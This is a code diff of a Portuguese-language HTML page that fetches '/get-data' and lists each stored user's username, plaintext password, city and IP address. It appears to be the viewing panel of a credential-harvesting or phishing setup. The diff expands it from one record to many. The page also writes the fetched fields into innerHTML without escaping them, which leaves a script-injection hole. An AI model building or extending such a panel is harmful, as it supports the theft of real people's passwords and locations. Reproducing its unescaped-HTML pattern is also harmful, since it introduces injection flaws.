@@ -1,50 +1,58 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="./styleCss/style.css">
-    <title>Dados Salvos</title>
-    <style>
-        body{
-            background: #000;
-            color: #fff;
-        }
-    </style>
+    <title>Receber Dados</title>
 </head>
+<style>
+    :root{
+    --font-family: Helvetica, Arial, sans-serif;
+    --sam:"SF Pro Text", "SF Pro Icons", system, -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", "Helvetica", "Arial", "Lucida Grande", "Ubuntu", "Cantarell", "Fira Sans", sans-serif;
+    
+}
+    body{
+        background: #000;
+        color: #fff;
+        font-family: var(--sam);
+    }
+</style>
 <body>
-    <h1 style="color: #fff;">Dados Salvos</h1>
-    <br><br>
-    <div id="data-container">
-        <p>Carregando dados...</p>
-    </div>
+    <center>
+        <h1>Dados do Usuário</h1>
+    </center>
+    <!--<button onclick="fetchUserData()">Carregar Dados</button>-->
+
+    <div id="userDataContainer"></div>
 
     <script>
-        // Função para carregar os dados do JSON
-        function loadData() {
-            fetch('/get-data')
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Erro ao carregar os dados');
+        async function fetchUserData() {
+            try {
+                const response = await fetch('/get-data');
+                if (!response.ok) throw new Error('Erro ao buscar dados');
+                
+                const userData = await response.json();
+
+                let userDataHtml = "<ul>";
+                for (const key in userData) {
+                    if (userData.hasOwnProperty(key)) {
+                        const user = userData[key];
+                        userDataHtml += `<li>Usuário: ${user.username}</li>`;
+                        userDataHtml += `<li>Senha: ${user.password}</li>`;
+                        userDataHtml += `<li>Cidade: ${user.city}</li>`;
+                        userDataHtml += `<li>IP: ${user.ip}</li><hr>`;
                     }
-                    return response.json();
-                })
-                .then(data => {
-                    // Exibe os dados
-                    const container = document.getElementById('data-container');
-                    container.innerHTML = `
-                        <p><strong>Usuário:</strong> ${data.username}</p>
-                        <p><strong>Senha:</strong> ${data.password}</p>
-                    `;
-                })
-                .catch(error => {
-                    const container = document.getElementById('data-container');
-                    container.innerHTML = `<p style="color: red;">${error.message}</p>`;
-                });
+                }
+                userDataHtml += "</ul>";
+
+                document.getElementById("userDataContainer").innerHTML = userDataHtml;
+            } catch (error) {
+                console.error('Erro ao carregar dados do usuário:', error);
+            }
         }
 
-        // Carrega os dados quando a página é carregada
-        window.onload = loadData;
+        fetchUserData();
     </script>
+
 </body>
 </html>
